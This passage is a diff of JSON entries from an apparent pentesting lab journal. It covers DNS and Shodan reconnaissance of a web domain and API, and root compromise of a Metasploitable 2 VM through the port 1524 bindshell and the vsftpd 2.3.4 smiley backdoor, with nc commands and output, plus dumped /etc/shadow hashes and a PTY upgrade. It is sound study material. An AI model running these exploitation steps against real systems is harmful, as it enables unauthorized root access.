+          {
+            "t": "p",
+            "text": "In standard web hosting, ports 2082, 2086, 2087, and 8880 are usually associated with cPanel administration. But here, on Render's ingress cluster, they represent something entirely different: **Cloudflare's default alternate HTTP/HTTPS proxy ports**."
+          },
+          {
+            "t": "table",
+            "head": [
+              "Protocol",
+              "Cloudflare Supported Ingress Ports"
+            ],
+            "rows": [
+              [
+                "**HTTP**",
+                "`80`, `8080`, `8880`, `2052`, `2082`, `2086`, `2095`"
+              ],
+              [
+                "**HTTPS**",
+                "`443`, `2053`, `2083`, `2087`, `2096`, `8443`"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "Cloudflare forwards traffic received on any of these ports through to the origin. Seeing all 256 addresses configured with this exact port signature is definitive proof that the entire subnet `216.24.57.0/24` is a dedicated, uniform Cloudflare edge routing block provisioned for Render."
+          }
+        ]
+      },
+      {
+        "h": "Raw IP rejection: HTTP 400 and 403",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "When Shodan probes any IP directly (e.g. `http://216.24.57.192/`), the banner returns:"
+          },
+          {
+            "t": "code",
+            "label": "banner",
+            "text": "HTTP/1.1 400 Bad Request\nServer: cloudflare\n<center><h1>400 Bad Request</h1></center>\n<hr><center>cloudflare</center>"
+          },
+          {
+            "t": "p",
+            "text": "Or `HTTP/1.1 403 Forbidden` with `Content-Length: 17`. Cloudflare does not route raw IP traffic to backend containers—it demands a valid HTTP `Host:` header matching a registered domain."
+          }
+        ]
+      },
+      {
+        "h": "Why 'ssl.cert.subject.cn' returned zero results",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Searching Shodan for `ssl.cert.subject.cn:\"radblok.co.za\"` returned no records. In pentesting and bug bounty, this is a major diagnostic finding with two important meanings:"
+          },
+          {
+            "t": "list",
+            "items": [
+              "**Mandatory SNI (Server Name Indication)**: Shodan's bulk IPv4 scanners connect to IP addresses directly. Because Render/Cloudflare hosts millions of websites on these shared ingress nodes, the edge server cannot guess which TLS certificate to present unless the client sends `radblok.co.za` in the TLS SNI ClientHello extension. Without SNI, Cloudflare presents its generic fallback cert, so Shodan never indexed the domain's certificate during broad IPv4 sweeps.",
+              "**Zero Origin Leaks**: Often, misconfigured sites expose their origin IP because the real VM previously served the SSL certificate directly to the web before Cloudflare was installed. The zero result confirms this server was provisioned behind Cloudflare from day one. The real GCP origin IP has never touched public IPv4 unproxied."
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Lab status & summary",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "Subnet mapping confirmed `216.24.57.0/24` is a complete 256-node Cloudflare/Render ingress cluster.",
+              "Port fingerprint (80, 2082, 2086, 2087, 8880) verified Cloudflare's standardized alternate proxy infrastructure.",
+              "Direct IP probes trigger 400/403 rejections at the edge, enforcing strict Host-header routing.",
+              "Zero cert results in Shodan confirmed strict SNI isolation and zero origin exposure.",
+              "OSINT / Shodan module for this target is fully concluded."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 17,
+    "date": "2026-10-02",
+    "module": "Reconnaissance & scanning",
+    "title": "DNS Zone Transfer (AXFR) with Dig: TCP 53 EOF vs RFC-compliant refusal",
+    "tags": [
+      "dns",
+      "axfr",
+      "dig",
+      "zone-transfer",
+      "recon",
+      "tcp53",
+      "radblok"
+    ],
+    "summary": "Tested DNS zone transfers (AXFR) using dig against xneelo's authoritative nameservers (ns1/ns2.host-h.net) and compared the behavior against enterprise infrastructure (Facebook). The tests revealed two distinct hardening mechanisms: xneelo forcefully drops TCP port 53 connections resulting in 'end of file' errors, whereas enterprise DNS completes the TCP handshake, returns the initial SOA record, and formally responds with a protocol-level refusal (Transfer failed). Neither server permitted zone disclosure.",
+    "sections": [
+      {
+        "h": "The AXFR tests",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ dig axfr @ns1.host-h.net radblok.co.za\n;; communications error to 129.232.248.30#53: end of file\n;; communications error to 129.232.248.30#53: end of file\n;; communications error to 129.232.248.30#53: end of file\n;; no servers could be reached\n\n$ dig axfr facebook.com @A.NS.FACEBOOK.COM\nfacebook.com.   3600    IN      SOA     a.ns.facebook.com. dns.facebook.com. ...\n; Transfer failed."
+          },
+          {
+            "t": "p",
+            "text": "Two completely different rejection signatures when attempting to transfer a zone. Understanding why they look different requires looking at how DNS works at Layer 4 (Transport)."
+          }
+        ]
+      },
+      {
+        "h": "Why AXFR uses TCP port 53 instead of UDP",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Almost all routine DNS lookups (`A`, `MX`, `TXT`) use **UDP port 53**. UDP is stateless, lightweight, and fast, but legacy UDP DNS packets are limited to 512 bytes (or ~1232–4096 bytes with modern EDNS0)."
+          },
+          {
+            "t": "p",
+            "text": "A complete DNS zone file containing hundreds or thousands of records can easily exceed hundreds of kilobytes. Therefore, RFC 1035 and RFC 5936 mandate that **DNS Zone Transfers (AXFR) must occur over TCP port 53** to ensure reliable, connection-oriented data transfer and retransmission."
+          }
+        ]
+      },
+      {
+        "h": "Two defensive refusal signatures",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Server Tested",
+              "Response from dig",
+              "Underlying Mechanism"
+            ],
+            "rows": [
+              [
+                "`ns1.host-h.net` (xneelo)",
+                "`communications error ...: end of file`",
+                "**Transport-level drop / TCP RST**. The firewall or BIND daemon at `129.232.248.30` accepts or intercepts the initial TCP connection on port 53, detects an unauthorized AXFR request, and immediately tears down the socket by sending a TCP FIN/RST packet without returning any DNS payload. `dig` receives 0 bytes from the closed stream, which it reports as `end of file`."
+              ],
+              [
+                "`a.ns.facebook.com`",
+                "`SOA ... ; Transfer failed.`",
+                "**Protocol-level refusal (RFC 5936)**. The nameserver completes the TCP handshake, echoes the start-of-authority (`SOA`) record to acknowledge the zone, and then explicitly transmits a DNS `REFUSED` (RCODE 5) header before terminating the transfer."
+              ]
+            ]
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "Both configurations are completely secure: neither server allows unauthorized zone transfers. The `end of file` signature is simply an abrupt network-level socket termination, while `Transfer failed` is an explicit, protocol-compliant rejection."
+          }
+        ]
+      },
+      {
+        "h": "Bonus observation: radblok.com vs radblok.co.za",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Resolving `radblok.com` returned `198.12.232.136`. This confirms `.com` is a completely different domain entity registered independently on a different network, whereas `radblok.co.za` is the target connected to Render/Cloudflare (`216.24.57.1`). Always double-check ccTLD vs gTLD boundaries during scoping."
+          }
+        ]
+      },
+      {
+        "h": "Lab status & takeaways",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "Demonstrated how AXFR queries operate over TCP 53 to pull complete zone records.",
+              "Verified that both authoritative nameservers (`ns1/ns2.host-h.net`) strictly block zone transfers.",
+              "Identified the difference between TCP RST socket termination (`end of file`) and DNS protocol refusal (`Transfer failed`).",
+              "Confirmed that brute-force / dictionary enumeration is required since AXFR is blocked."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 18,
+    "date": "2026-10-02",
+    "module": "Reconnaissance & scanning",
+    "title": "Target Provisioning & Service Discovery: Metasploitable 2 TCP SYN Scan",
+    "tags": [
+      "nmap",
+      "metasploitable",
+      "port-scan",
+      "service-enumeration",
+      "recon",
+      "vsftpd",
+      "samba",
+      "bindshell"
+    ],
+    "summary": "Provisioned an intentionally vulnerable target (Metasploitable 2) on the bridged local subnet (10.16.141.205), resolving virtual disk corruption and hypervisor configuration constraints (32-bit Ubuntu, IDE controller, single CPU). Verified Layer 3 connectivity from Kali Linux via ICMP echo (0% loss), followed by an active TCP SYN stealth service scan (nmap -sS -sV -T4). Discovered 22 open ports exposing high-risk legacy daemons including vsftpd 2.3.4, OpenSSH 4.7p1, Samba 3.x, UnrealIRCd, and an unauthenticated root bindshell on port 1524.",
+    "sections": [
+      {
+        "h": "Layer 3 Connectivity Verification",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Before executing port scans, verified that the bridged virtual network adapter (`08:00:27:1D:80:01`) established bidirectional IP communication between Kali Linux and the Metasploitable 2 target at `10.16.141.205`."
+          },
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "┌──(general㉿lee)-[~]\n└─$ ping -c 3 10.16.141.205\nPING 10.16.141.205 (10.16.141.205) 56(84) bytes of data.\n64 bytes from 10.16.141.205: icmp_seq=1 ttl=64 time=27.8 ms\n64 bytes from 10.16.141.205: icmp_seq=2 ttl=64 time=131 ms\n64 bytes from 10.16.141.205: icmp_seq=3 ttl=64 time=61.8 ms\n\n--- 10.16.141.205 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2011ms\nrtt min/avg/max/mdev = 27.760/73.477/130.834/42.877 ms"
+          },
+          {
+            "t": "p",
+            "text": "The target returned ICMP Echo Replies with TTL=64, confirming a local Linux kernel hop with zero intermediate routing filtering."
+          }
+        ]
+      },
+      {
+        "h": "Active Service & Version Enumeration (nmap)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Executed a TCP SYN Half-Open scan (`-sS`) combined with service probe interrogation (`-sV`) against the top 1000 ports at timing template 4 (`-T4`):"
+          },
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "┌──(general㉿lee)-[~]\n└─$ sudo nmap -sS -sV -T4 10.16.141.205\nStarting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 22:43 +0200\nNmap scan report for 10.16.141.205\nHost is up (0.019s latency).\nNot shown: 977 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n23/tcp   open  telnet      Linux telnetd\n25/tcp   open  smtp        Postfix smtpd\n53/tcp   open  domain      ISC BIND 9.4.2\n80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)\n111/tcp  open  rpcbind     2 (RPC #100000)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n512/tcp  open  exec        netkit-rsh rexecd\n513/tcp  open  login\n514/tcp  open  tcpwrapped\n1099/tcp open  java-rmi    GNU Classpath grmiregistry\n1524/tcp open  bindshell   Metasploitable root shell\n2049/tcp open  nfs         2-4 (RPC #100003)\n2121/tcp open  ftp         ProFTPD 1.3.1\n3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5\n5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7\n5900/tcp open  vnc         VNC (protocol 3.3)\n6000/tcp open  X11         (access denied)\n6667/tcp open  irc         UnrealIRCd\n8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)\n8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1\nMAC Address: 08:00:27:1D:80:01 (Oracle VirtualBox virtual NIC)\nService Info: Hosts: metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel"
+          },
+          {
+            "t": "p",
+            "text": "Out of 1000 scanned ports, 977 returned TCP RST (`closed tcp ports (reset)`), while **22 ports are actively listening**."
+          }
+        ]
+      },
+      {
+        "h": "Critical Attack Surface Breakdown",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Port / Protocol",
+              "Service Version",
+              "Vulnerability Class",
+              "Significance"
+            ],
+            "rows": [
+              [
+                "`21/tcp`",
+                "vsftpd 2.3.4",
+                "Supply Chain Backdoor (CVE-2011-2523)",
+                "Contains a malicious smiley-face `:))` trigger that spawns a root shell on TCP 6200."
+              ],
+              [
+                "`1524/tcp`",
+                "Metasploitable root shell (Ingreslock)",
+                "Direct Unauthenticated Shell",
+                "Legacy backdoor listening directly on port 1524 granting instant root privileges without credentials."
+              ],
+              [
+                "`139, 445/tcp`",
+                "Samba smbd 3.X - 4.X",
+                "Command Execution (`usermap_script`)",
+                "Arbitrary command execution via Samba user configuration vulnerability (CVE-2007-2447)."
+              ],
+              [
+                "`6667/tcp`",
+                "UnrealIRCd",
+                "Trojaned Source Backdoor",
+                "Backdoored IRC server allowing execution of arbitrary commands (CVE-2010-2075)."
+              ],
+              [
+                "`80, 8180/tcp`",
+                "Apache 2.2.8 / Tomcat 5.5",
+                "Web App & Manager Weaknesses",
+                "Hosts vulnerable web applications (Mutillidae, DVWA) and weak credential managers (`tomcat:tomcat`)."
+              ]
+            ]
+          },
+          {
+            "t": "note",
+            "kind": "important",
+            "text": "Unlike public cloud infrastructure where ingress traffic passes through reverse proxies (e.g. Cloudflare / Render), this internal target exposes bare daemons directly to Layer 4 probing."
+          }
+        ]
+      },
+      {
+        "h": "Key Takeaways & Next Steps",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "Successfully resolved VM boot kernel panic by re-downloading uncorrupted media and aligning VirtualBox settings to 32-bit Linux / IDE / 1 CPU.",
+              "Established full Layer 2 / Layer 3 connectivity across Kali Linux and Metasploitable on `10.16.141.0/24`.",
+              "Identified 22 open services using `nmap` version scanning.",
+              "Prioritized high-severity targets for the next vulnerability assessment phase: vsftpd 2.3.4 backdoor, Samba usermap script, and port 1524 bindshell."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 19,
+    "date": "2026-10-02",
+    "module": "Exploitation & Initial Access",
+    "title": "Unauthenticated Root Bindshell: Ingreslock (TCP 1524) Analysis",
+    "tags": [
+      "bindshell",
+      "netcat",
+      "ingreslock",
+      "root",
+      "initial-access",
+      "metasploitable",
+      "cve"
+    ],
+    "summary": "Demonstrated instant unauthenticated root compromise via TCP port 1524 (ingreslock) using basic netcat (nc). Verified complete system control with uid=0(root), explored the underlying UNIX historical lineage of the Ingreslock backdoor, and established the operational distinction between bindshells and reverse shells in penetration testing.",
+    "sections": [
+      {
+        "h": "Initial Access via Netcat",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Following the port scan that flagged `1524/tcp open bindshell`, executed a direct raw TCP connection from Kali Linux using Netcat (`nc`):"
+          },
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "┌──(general㉿lee)-[~]\n└─$ nc -vn 10.16.141.205 1524\n(UNKNOWN) [10.16.141.205] 1524 (ingreslock) open\nroot@metasploitable:/# \n\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@metasploitable:/# whoami\nroot\n\nroot@metasploitable:/# uname -a\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux"
+          },
+          {
+            "t": "p",
+            "text": "No username, password, or cryptographic handshake was requested. The target immediately returned an interactive root prompt with full system authority (`uid=0, gid=0`)."
+          }
+        ]
+      },
+      {
+        "h": "Why does Port 1524 exist? (The Ingreslock Story)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Port 1524 is registered in IANA and `/etc/services` as **`ingreslock`**—originally used by the Ingres relational database management system for its locking service."
+          },
+          {
+            "t": "p",
+            "text": "In early UNIX history, system crackers and rootkit authors frequently bound an interactive `/bin/sh` listener to port 1524. Because `ingreslock` appeared legitimate in service tables, administrators glancing at basic network outputs often overlooked the listening port."
+          },
+          {
+            "t": "p",
+            "text": "In Metasploitable 2, this is configured via `openbsd-inetd` (`/etc/inetd.conf`), instructing the superserver to automatically pipe stdin and stdout of `/bin/sh` to any inbound connection on port 1524."
+          }
+        ]
+      },
+      {
+        "h": "Architectural Distinction: Bind Shell vs Reverse Shell",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Shell Type",
+              "How Connection is Established",
+              "Defensive / Firewall Impact"
+            ],
+            "rows": [
+              [
+                "**Bind Shell** (Port 1524)",
+                "The target opens a listening port and waits for the attacker to connect inward (`Kali -> Target:1524`).",
+                "Easily blocked by perimeter firewalls or NAT if inbound non-standard ports are denied. Only works because we are on the same local subnet."
+              ],
+              [
+                "**Reverse Shell**",
+                "The target initiates an outbound TCP connection back to the attacker's listener (`Target -> Kali:4444`).",
+                "Much more effective in real-world scenarios because egress firewall rules typically allow outbound connections (e.g. ports 80, 443)."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Recommended Post-Exploitation Inspection",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "With unrestricted root access on the machine, you can observe critical OS security files that normal users cannot read:"
+          },
+          {
+            "t": "list",
+            "items": [
+              "`cat /etc/shadow` — View password hashes for all accounts (`msfadmin`, `root`, `user`).",
+              "`cat /etc/inetd.conf | grep 1524` — See the exact line spawning the backdoor shell.",
+              "`netstat -tulnp` — See all internal listening sockets from the kernel's perspective.",
+              "`cat /etc/issue` — Confirm host OS distribution details."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 20,
+    "date": "2026-10-02",
+    "module": "Post-Exploitation & System Auditing",
+    "title": "Internal System Auditing: Shadow Hashes, xinetd Superserver & Socket Discovery",
+    "tags": [
+      "post-exploitation",
+      "shadow",
+      "md5crypt",
+      "xinetd",
+      "netstat",
+      "distccd",
+      "metasploitable"
+    ],
+    "summary": "Audited critical internal OS files from the root shell on Metasploitable 2. Identified MD5-crypt ($1$) password hashes in /etc/shadow, tracked down the superserver daemon (xinetd PID 4622) managing port 1524, and analyzed internal socket bindings via netstat to reveal hidden internal attack surfaces including distccd (port 3632) and Ruby (port 8787).",
+    "sections": [
+      {
+        "h": "1. Why grep on /etc/inetd.conf returned empty",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Running `grep 1524 /etc/inetd.conf` returned no output because modern Linux systems (and Ubuntu 8.04) migrated from the monolithic legacy `inetd` to modular **`xinetd`** (Extended Internet Services Daemon)."
+          },
+          {
+            "t": "p",
+            "text": "Looking at the `netstat -tulnp` output confirms PID `4622` is **`xinetd`**, which manages individual service files inside `/etc/xinetd.d/`. The bindshell configuration is located inside `/etc/xinetd.d/` or `/etc/xinetd.conf`."
+          }
+        ]
+      },
+      {
+        "h": "2. Linux Shadow Hash Cryptanalysis (/etc/shadow)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Dumping `/etc/shadow` reveals the authentication state of every user account on the system. All non-locked passwords use the **`$1$`** prefix:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Username",
+              "Hash Field",
+              "Hash Type / Status",
+              "Security Analysis"
+            ],
+            "rows": [
+              [
+                "`root`",
+                "`$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.`",
+                "MD5-crypt (`$1$`)",
+                "Salt: `/avpfBJ1`. Vulnerable to high-speed offline dictionary attacks."
+              ],
+              [
+                "`msfadmin`",
+                "`$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/`",
+                "MD5-crypt (`$1$`)",
+                "Salt: `XN10Zj2c`. Known weak default password (`msfadmin`)."
+              ],
+              [
+                "`user`",
+                "`$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0`",
+                "MD5-crypt (`$1$`)",
+                "Standard user account with weak credentials (`user`)."
+              ],
+              [
+                "`postgres`",
+                "`$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/`",
+                "MD5-crypt (`$1$`)",
+                "Database superuser with local OS password (`postgres`)."
+              ],
+              [
+                "`sys`, `klog`, `service`",
+                "`$1$...`",
+                "MD5-crypt (`$1$`)",
+                "Active password hashes set on system maintenance accounts."
+              ],
+              [
+                "`bin`, `daemon`, `nobody`",
+                "`*` or `!`",
+                "Locked / No Password",
+                "System accounts disabled from direct password authentication."
+              ]
+            ]
+          },
+          {
+            "t": "note",
+            "kind": "important",
+            "text": "Password Hash Identifiers: `$1$` = MD5-crypt (obsolete and computationally trivial to crack with modern GPUs), `$5$` = SHA-256, `$6$` = SHA-512, `$y$` = yescrypt (modern standard)."
+          }
+        ]
+      },
+      {
+        "h": "3. Internal Socket & Service Discovery (netstat -tulnp)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Comparing the internal `netstat` socket list against our external Nmap scan revealed services managed by central daemons and internal-only bindings:"
+          },
+          {
+            "t": "list",
+            "items": [
+              "**xinetd Fleet (PID 4622)**: Handles ports 21 (ftp), 23 (telnet), 512 (rexec), 513 (rlogin), 514 (rsh), 69 (tftp), and 1524 (ingreslock).",
+              "**Port 3632 (distccd)**: Discovered listening on IPv6/IPv4 (`4468/distccd`). distcc is famous for CVE-2004-2687, enabling remote code execution without authentication.",
+              "**Port 8787 (ruby)**: Internal Ruby process running web or RPC interfaces (`4760/ruby`).",
+              "**Port 6000 (Xtightvnc / X11)**: External scan showed `X11 (access denied)` — `netstat` confirms PID 4777 binds both TCP 5900 (RFB protocol) and 6000 (X11 server)."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 21,
+    "date": "2026-10-03",
+    "module": "Reconnaissance & scanning",
+    "title": "Backend REST API Reconnaissance: radblok-api.onrender.com & Mongoose Model Discovery",
+    "tags": [
+      "api",
+      "recon",
+      "express",
+      "mongodb",
+      "mongoose",
+      "render",
+      "radblok",
+      "rest"
+    ],
+    "summary": "Reconnaissance shifted to the newly enabled backend application at https://radblok-api.onrender.com. Layer 7 HTTP analysis identified a live Node.js/Express service interacting with a MongoDB database (evidenced by Mongoose ObjectIds and __v fields) and Cloudinary media assets. Successfully mapped public endpoints (/api, /api/users, /api/posts) revealing application structure, user metadata, and content architecture.",
+    "sections": [
+      {
+        "h": "Service Activation & Header Fingerprinting",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Probing `https://radblok-api.onrender.com` confirmed that unlike the suspended frontend, the backend Render service is active and communicating with its origin:"
+          },
+          {
+            "t": "code",
+            "label": "curl",
+            "text": "$ curl -IL https://radblok-api.onrender.com/api\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\naccess-control-allow-credentials: true\naccess-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE\nx-powered-by: Express\nx-render-origin-server: Render\nServer: cloudflare\nCF-RAY: ...-CPT\n\nWelcome to radblok API"
+          },
+          {
+            "t": "p",
+            "text": "The presence of `x-render-origin-server: Render` and the absence of `x-render-routing: suspend-by-user` confirms the backend web process is awake and executing requests."
+          }
+        ]
+      },
+      {
+        "h": "Endpoint Enumeration & Data Models",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Testing common REST API routes exposed several active endpoints returning structured JSON data:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Endpoint",
+              "HTTP Status",
+              "Response / Architecture Clues"
+            ],
+            "rows": [
+              [
+                "`GET /`",
+                "`500 Internal Server Error`",
+                "`{\"message\":\"Not Found - / \"}` — Express error handling middleware."
+              ],
+              [
+                "`GET /api`",
+                "`200 OK`",
+                "`Welcome to radblok API` — Root API health string."
+              ],
+              [
+                "`GET /api/users`",
+                "`200 OK`",
+                "JSON array disclosing author profiles: `name`, `email` (`leecpt@gmail.com`), `posts` count, and Cloudinary avatar URI."
+              ],
+              [
+                "`GET /api/posts`",
+                "`200 OK`",
+                "JSON object returning `total: 3` and post array with titles ('Bring in the Master!', 'Back On The Line'), HTML content, and timestamps."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Underlying Technology Stack Fingerprint",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "**Runtime / Web Framework**: Node.js with **Express** (`x-powered-by: Express`).",
+              "**Database Layer**: **MongoDB** with **Mongoose ODM** — indicated by 24-character hexadecimal `_id` values (e.g. `68bb71563cab34b0badf6cbe`) and the internal Mongoose versioning attribute `__v: 0`.",
+              "**Media Storage**: **Cloudinary** CDN (`res.cloudinary.com/dhdc57kw9/...`) for user avatars and article thumbnails.",
+              "**Edge / Network**: **Cloudflare** Cape Town PoP (`CPT`) providing TLS termination and reverse proxying to Render PaaS."
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Security & Exposure Analysis",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "1. **User Metadata Disclosure**: The `GET /api/users` endpoint returns author emails and MongoDB internal IDs without authentication. In pen-testing scopes, this provides valid usernames for brute-force or credential stuffing against authentication endpoints."
+          },
+          {
+            "t": "p",
+            "text": "2. **CORS Configuration**: `access-control-allow-credentials: true` is enabled. Once the frontend `radblok.co.za` is reactivated, origin verification on cookies and tokens can be audited for cross-origin risks."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 22,
+    "date": "2026-10-03",
+    "module": "Exploitation & Initial Access",
+    "title": "Supply Chain Backdoor: vsftpd 2.3.4 (CVE-2011-2523) & Raw Socket Shells",
+    "tags": [
+      "vsftpd",
+      "backdoor",
+      "cve-2011-2523",
+      "netcat",
+      "root",
+      "exploitation",
+      "pty"
+    ],
+    "summary": "Demonstrated manual triggering of the infamous vsftpd 2.3.4 supply chain backdoor (CVE-2011-2523) without automated exploit frameworks. Transmitted a username containing the smiley token (:) ) causing the daemon to spawn a root listener on TCP 6200. Analyzed raw netcat shell behavior (absence of PTY prompt) and demonstrated shell stabilization via Python PTY spawning.",
+    "sections": [
+      {
+        "h": "The Smiley Trigger Mechanism (Port 21)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "In July 2011, the official vsftpd 2.3.4 archive on the master repository was compromised. The attacker inserted a hidden check: if any username contains the characters `:)`, a signal handler triggers `execl(\"/bin/sh\",\"sh\",(char *)0)` on port 6200."
+          },
+          {
+            "t": "code",
+            "label": "kali (terminal 1)",
+            "text": "┌──(general㉿lee)-[~]\n└─$ nc -vn 192.168.0.155 21\n(UNKNOWN) [192.168.0.155] 21 (ftp) open\n220 (vsFTPd 2.3.4)\n\nUSER hacker:)\n331 Please specify the password.\nPASS password"
+          },
+          {
+            "t": "p",
+            "text": "Once `PASS` is sent, the FTP connection freezes by design as the daemon forks the background listener."
+          }
+        ]
+      },
+      {
+        "h": "Connecting to the Backdoor (Port 6200)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "In a second terminal, netcat successfully connected to the spawned backdoor socket:"
+          },
+          {
+            "t": "code",
+            "label": "kali (terminal 2)",
+            "text": "┌──(general㉿lee)-[~]\n└─$ nc -vn 192.168.0.155 6200\n(UNKNOWN) [192.168.0.155] 6200 (?) open"
+          },
+          {
+            "t": "p",
+            "text": "Notice that unlike SSH or a local terminal, no `root@target:~#` prompt appears. This is a **raw non-interactive `/bin/sh` stream**."
+          }
+        ]
+      },
+      {
+        "h": "Understanding Raw Shells vs Interactive PTYs",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Shell Type",
+              "Prompt Display",
+              "Behavior & Control"
+            ],
+            "rows": [
+              [
+                "**Raw Socket Shell** (`nc`)",
+                "Blank cursor (No PS1)",
+                "Standard Input (stdin) and Standard Output (stdout) are connected directly to the TCP stream. Commands execute upon pressing Enter, but there is no terminal formatting."
+              ],
+              [
+                "**Interactive PTY**",
+                "`root@metasploitable:/#`",
+                "A pseudo-terminal allocated via `python -c 'import pty; pty.spawn(\"/bin/bash\")'`. Provides command history, arrow navigation, and shell prompts."
+              ]
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 23,
+    "date": "2026-10-03",
+    "module": "Reconnaissance & scanning",
+    "title": "Layer 2 & Layer 3 Host Verification: ARP Resolution & VirtualBox OUI Analysis",
+    "tags": [
+      "arp",
+      "icmp",
+      "ping",
+      "mac-address",
+      "oui",
+      "virtualbox",
+      "recon",
+      "networking"
+    ],
+    "summary": "Following subnet migration to 192.168.0.0/24, conducted definitive Layer 2 and Layer 3 host discovery from Kali Linux targeting Metasploitable 2 (192.168.0.155). Verified bidirectional packet routing via ICMP Echo (0% packet loss) and confirmed Layer 2 hardware adjacency through ARP cache inspection, validating the Oracle VirtualBox hardware prefix (08:00:27).",
+    "sections": [
+      {
+        "h": "Layer 3 ICMP Round-Trip Analysis",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Tested end-to-end IP reachability across the bridged wireless network:"
+          },
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "┌──(general㉿lee)-[~]\n└─$ ping -c 2 192.168.0.155\nPING 192.168.0.155 (192.168.0.155) 56(84) bytes of data.\n64 bytes from 192.168.0.155: icmp_seq=1 ttl=64 time=185 ms\n64 bytes from 192.168.0.155: icmp_seq=2 ttl=64 time=3.09 ms\n\n--- 192.168.0.155 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1014ms\nrtt min/avg/max/mdev = 3.086/93.801/184.517/90.715 ms"
+          },
+          {
+            "t": "p",
+            "text": "The return TTL of **64** is the textbook signature of a Linux kernel hop. The second packet RTT dropped to **3.09 ms**, reflecting immediate local Wi-Fi transmission after initial ARP resolution."
+          }
+        ]
+      },
+      {
+        "h": "Layer 2 Hardware Adjacency (ARP)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Inspected the Linux kernel's ARP table to verify the hardware link without relying on higher-layer network stacks:"
+          },
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "┌──(general㉿lee)-[~]\n└─$ arp -n 192.168.0.155\nAddress                  HWtype  HWaddress           Flags Mask            Iface\n192.168.0.155            ether   08:00:27:1d:80:01   C                     eth0"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Field",
+              "Observed Value",
+              "Technical Meaning"
+            ],
+            "rows": [
+              [
+                "`HWaddress`",
+                "`08:00:27:1d:80:01`",
+                "**Oracle VirtualBox Virtual NIC**. The initial 3 bytes (`08:00:27`) represent the IEEE Organizationally Unique Identifier (OUI) allocated to VirtualBox."
+              ],
+              [
+                "`Flags`",
+                "`C` (Complete)",
+                "The ARP request broadcast was successfully replied to by the target's NIC, and the mapping is cached in memory."
+              ],
+              [
+                "`Iface`",
+                "`eth0`",
+                "Direct Layer 2 broadcast domain adjacency (both VMs share the bridged wireless adapter)."
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Self-Probe vs Cross-Host Probe Contrast",
+        "blocks": [
+          {
+            "t": "p",
